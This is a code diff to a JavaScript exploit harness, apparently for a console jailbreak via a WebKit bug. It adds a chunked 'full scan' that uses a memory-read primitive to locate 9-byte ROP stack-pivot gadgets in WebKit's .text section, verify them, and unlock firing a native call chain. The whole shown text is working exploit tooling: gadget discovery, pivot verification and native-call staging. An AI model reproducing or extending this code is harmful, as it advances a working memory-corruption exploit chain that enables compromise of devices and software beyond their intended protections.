@@ -74,7 +74,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ai";
+const BUILD_ID = "rw-20250830aj";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -218,7 +218,7 @@ const raceBuf = [];
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
 let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
-let btnVerifyPivot, btnScanPivot;
+let btnVerifyPivot, btnScanPivot, btnScanPivotFull;
 let gadgetBtns = [];
 let g5BarBtns = [];
 let bisectBtns = [];
@@ -228,7 +228,9 @@ let nativeStaged = false;
 let nativeAllowed = false;
 let pivotReady = false;
 let pivotScan = null;
+let pivotFullScan = null;
 let scanPivotAuto = false;
+let scanFullAuto = false;
 let scanPivotStop = false;
 let scanQuiet = false;
 let scanRenderPending = 0;
@@ -313,8 +315,12 @@ function setUi() {
     if (btnRwProof) btnRwProof.disabled = busy || !ready;
     if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
     if (btnScanPivot) {
-        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto);
+        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto && !scanFullAuto);
         btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
+    }
+    if (btnScanPivotFull) {
+        btnScanPivotFull.disabled = !ready || (busy && !scanFullAuto && !scanPivotAuto);
+        btnScanPivotFull.textContent = scanFullAuto ? "Stop full scan" : "Scan full (auto)";
     }
     if (btnNative) {
         btnNative.disabled = busy || !ready || !nativeAllowed;
@@ -747,10 +753,17 @@ function gateNativeFire(p, off) {
             mark("POP-MISS", v.popMissing.join(", "));
         return false;
     }
-    if (params.get("fullverify") === "1") {
-        const vf = verifyFullChainSet(addr => read1p(p, addr), wb, off);
-        if (!vf.ok && vf.pivot.bad.length)
-            mark("PIVOT-FULL-WARN", vf.pivot.bad.join(", ") + " — prefix OK, poops tail may OOM N5");
+    const vFull = verifyFullChainSet(addr => read1p(p, addr), wb, off);
+    if (!vFull.ok) {
+        const fullBad = vFull.pivot.bad.filter(b => b.includes("prefix-only"));
+        if (fullBad.length) {
+            mark("NATIVE-SKIP", "prefix OK but full G0-G4 poops gadgets missing — tap Scan full (auto)");
+            mark("PIVOT-FULL-HINT", fullBad.map(b => b.split(" ")[0]).join(", ")
+                + " need 9-byte poops RVAs (prefix hits @ +0xe3e4a etc. are wrong code)");
+            return false;
+        }
+        if (vFull.pivot.bad.length)
+            mark("PIVOT-FULL-WARN", vFull.pivot.bad.join(", "));
     }
     return true;
 }
@@ -2084,6 +2097,30 @@ function pivotRowsNeedingPrefixScan(p, webkitBase, off) {
     return out;
 }
 
+/** True when effective RVA matches full poops execution bytes (G0-G4). */
+function pivotRowFullExecOk(p, webkitBase, off, row) {
+    if (!p || !webkitBase || !row) return false;
+    const label = row[0];
+    const key = row[1];
+    const rva = off[key];
+    if (rva == null) return false;
+    const exec = pivotExecPattern(label, off);
+    if (!exec) return false;
+    return checkPivotBytes(a => read1p(p, a), webkitBase, rva, exec);
+}
+
+function pivotRowsNeedingFullExecScan(p, webkitBase, off) {
+    const out = [];
+    for (let i = 0; i < PIVOT_ROWS.length; i++) {
+        const row = PIVOT_ROWS[i];
+        const label = row[0];
+        if (label === "MOV_RDI_RAX" || label === "G5") continue;
+        if (pivotRowFullExecOk(p, webkitBase, off, row)) continue;
+        out.push(row);
+    }
+    return out;
+}
+
 function pivotRowDone(found, key, p, webkitBase, off) {
     const row = pivotRowByKey(key);
     if (!row) return found[key] != null;
@@ -2466,6 +2503,188 @@ async function scanPivotChunk() {
     return runPivotScanAuto();
 }
 
+function preparePivotFullScan(webkitBase, p) {
+    const off = loadEffectiveOff();
+    let rowIdx = PIVOT_ROWS.length;
+    for (let i = 0; i < PIVOT_ROWS.length; i++) {
+        const row = PIVOT_ROWS[i];
+        const label = row[0];
+        if (label === "MOV_RDI_RAX" || label === "G5") continue;
+        if (!pivotRowFullExecOk(p, webkitBase, off, row)) {
+            rowIdx = i;
+            break;
+        }
+    }
+    pivotFullScan = {
+        base: String(webkitBase),
+        rowIdx,
+        cursor: null,
+        bestHit: null,
+    };
+    if (rowIdx < PIVOT_ROWS.length) {
+        mark("FULL-SCAN-START", "scanning " + PIVOT_ROWS[rowIdx][0]
+            + " for 9-byte poops gadget in low .text");
+    }
+}
+
+/** Chunked full-pattern scan — 16-byte window, step 4 (finds 9-byte poops G0-G4). */
+async function scanPivotFullRowPhase(p, webkitBase, off) {
+    if (!pivotFullScan || String(pivotFullScan.base) !== String(webkitBase))
+        preparePivotFullScan(webkitBase, p);
+
+    while (pivotFullScan.rowIdx < PIVOT_ROWS.length) {
+        const skipRow = PIVOT_ROWS[pivotFullScan.rowIdx];
+        const skipLab = skipRow[0];
+        if (skipLab === "MOV_RDI_RAX" || skipLab === "G5") {
+            pivotFullScan.rowIdx++;
+            pivotFullScan.cursor = null;
+            pivotFullScan.bestHit = null;
+            continue;
+        }
+        if (!pivotRowFullExecOk(p, webkitBase, off, skipRow)) break;
+        pivotFullScan.rowIdx++;
+        pivotFullScan.cursor = null;
+        pivotFullScan.bestHit = null;
+    }
+
+    if (pivotFullScan.rowIdx >= PIVOT_ROWS.length) {
+        mark("FULL-SCAN-DONE", "all G0-G4 full poops gadgets found — Verify pivot");
+        return "done";
+    }
+
+    const row = PIVOT_ROWS[pivotFullScan.rowIdx];
+    const label = row[0];
+    const key = row[1];
+    const pat = pivotExecPattern(label, off);
+    if (!pat) {
+        pivotFullScan.rowIdx++;
+        pivotFullScan.cursor = null;
+        pivotFullScan.bestHit = null;
+        return "continue";
+    }
+
+    const cap = scanCapOff();
+    const range = {
+        minRva: SCAN_PIVOT_MIN,
+        maxRva: Math.min(SCAN_LOW_MAX, cap),
+    };
+    let rva = pivotFullScan.cursor != null
+        ? pivotFullScan.cursor
+        : (range.minRva & ~3);
+    let steps = 0;
+    const hint = off[key] != null ? off[key] : pivotHint(key);
+    const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;
+
+    while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
+        if (fillWindow16(p, webkitBase, rva, _win16)) {
+            const maxStart = 16 - pat.length;
+            for (let start = 0; start <= maxStart; start++) {
+                if (!matchPatAt(_win16, start, pat)) continue;
+                const cand = rva + start;
+                if (pivotFullScan.bestHit == null)
+                    pivotFullScan.bestHit = { rva: cand };
+                else if (hint > 0
+                    && Math.abs(cand - hint) < Math.abs(pivotFullScan.bestHit.rva - hint))
+                    pivotFullScan.bestHit = { rva: cand };
+            }
+        }
+        rva += 4;
+        steps++;
+        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
+            await new Promise(r => setTimeout(r, 0));
+    }
+
+    pivotFullScan.cursor = rva;
+    scanState("full " + label + " @+0x" + rva.toString(16));
+
+    if (scanPivotStop) return "stopped";
+    if (rva < range.maxRva) return "continue";
+
+    const hit = pivotFullScan.bestHit;
+    pivotFullScan.cursor = null;
+    pivotFullScan.bestHit = null;
+
+    if (hit != null) {
+        savePivotFullOverride(webkitBase, { [key]: hit.rva });
+        mark("FULL-SCAN-HIT", label + " +0x" + hit.rva.toString(16)
+            + (hint ? " prefix-was +0x" + hint.toString(16) : "")
+            + " bytes=" + gadgetBytesHex(p, webkitBase, hit.rva, Math.max(pat.length, 12)));
+        pivotFullScan.rowIdx++;
+        return "continue";
+    }
+
+    mark("FULL-SCAN-MISS", label + " — no full poops gadget in low .text (0x"
+        + range.minRva.toString(16) + "-0x" + range.maxRva.toString(16) + ")");
+    pivotFullScan.rowIdx++;
+    return "continue";
+}
+
+async function runPivotFullScanLoop() {
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) return;
+
+    scanFullAuto = true;
+    scanPivotStop = false;
+    scanQuiet = true;
+    busy = true;
+    setUi();
+
+    try {
+        while (scanFullAuto && !scanPivotStop) {
+            const st = await scanPivotFullRowPhase(p, webkitBase, off);
+            if (st === "stopped") break;
+            if (st === "done") break;
+        }
+        if (scanPivotStop)
+            mark("FULL-SCAN-STOP", "cancelled");
+        else
+            verifyPivotManual(true);
+    } catch (err) {
+        mark("FULL-SCAN-FAIL", err.message || String(err));
+        state("full scan error", "bad");
+    } finally {
+        scanQuiet = false;
+        scanRenderPending = 0;
+        scanFullAuto = false;
+        scanPivotStop = false;
+        busy = false;
+        renderOut();
+        setUi();
+    }
+}
+
+async function runPivotFullScanAuto() {
+    if (!ready || !window.p) return;
+    if (scanFullAuto || scanPivotAuto) {
+        scanPivotStop = true;
+        mark("FULL-SCAN-STOP", "stopping after current chunk…");
+        return;
+    }
+
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("FULL-SCAN-SKIP", "no webkitBase — Save bases first");
+        return;
+    }
+
+    preparePivotFullScan(webkitBase, p);
+    const needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
+    if (needs.length === 0) {
+        mark("FULL-SCAN-SKIP", "all G0-G4 full gadgets verify — tap Verify pivot");
+        verifyPivotManual();
+        return;
+    }
+    state("full scan " + needs.map(r => r[0]).join(", ") + "…", "warn");
+    mark("FULL-SCAN-AUTO", "9-byte poops scan: " + needs.map(r => r[0]).join(", ")
+        + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");
+
+    await runPivotFullScanLoop();
+}
+
 function verifyPivotManual(fromScan) {
     if (!ready || !window.p || busy) return;
     const p = window.p;
@@ -2492,7 +2711,7 @@ function verifyPivotManual(fromScan) {
     if (prefixBad.length) {
         mark("PIVOT-BAD", prefixBad.join(", ") + " — prefix bytes mismatch at RVA");
         logPivotBadBytes(p, webkitBase, off, prefixBad);
-        mark("PIVOT-HINT", "tap Scan pivot (auto) for chunked prefix rescan");
+        mark("PIVOT-HINT", "tap Scan full (auto) for chunked 9-byte poops rescan in low .text");
     }
     if (fullOnlyBad.length) {
         mark("PIVOT-FULL-BAD", fullOnlyBad.map(b => b.split(" ")[0]).join(", ")
@@ -2514,9 +2733,11 @@ function verifyPivotManual(fromScan) {
     if (v.ok) {
         mark("PIVOT-READY", v.pivot.count + "/" + v.pivot.total
             + " prefix pivot + " + v.popGood.length + " pop");
-        if (!vFull.ok)
-            mark("PIVOT-FULL-WARN", "bisect unlocked on prefix — N5 may OOM until full poops bytes match");
-        state("chain OK (prefix) — bisect N2→N5 or Fire smoke", "ok");
+        if (vFull.ok)
+            mark("PIVOT-FULL-READY", "all G0-G4 full poops bytes match — Fire native / N5 safe");
+        else
+            mark("PIVOT-FULL-WARN", "bisect unlocked on prefix — tap Scan full (auto) before Fire native / N5");
+        state(vFull.ok ? "chain OK (full) — Fire native or N5" : "chain OK (prefix) — Scan full then N5", "ok");
     } else {
         state("chain not ready — " + pivotNotReadyMsg(v.pivot), "warn");
     }
@@ -4545,6 +4766,7 @@ function init() {
     btnPsfreeStop = $("btn-psfree-stop");
     btnVerifyPivot = $("btn-verify-pivot");
     btnScanPivot = $("btn-scan-pivot");
+    btnScanPivotFull = $("btn-scan-pivot-full");
     btnPeek = $("btn-peek");
     btnClear = $("btn-clear");
 
@@ -4562,6 +4784,7 @@ function init() {
     wireClick(btnRwProof, function () { return runRwProofManual(); });
     wireClick(btnVerifyPivot, verifyPivotManual);
     wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
+    wireClick(btnScanPivotFull, function () { return runPivotFullScanAuto(); });
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnOneReadLk, runOneReadLk);
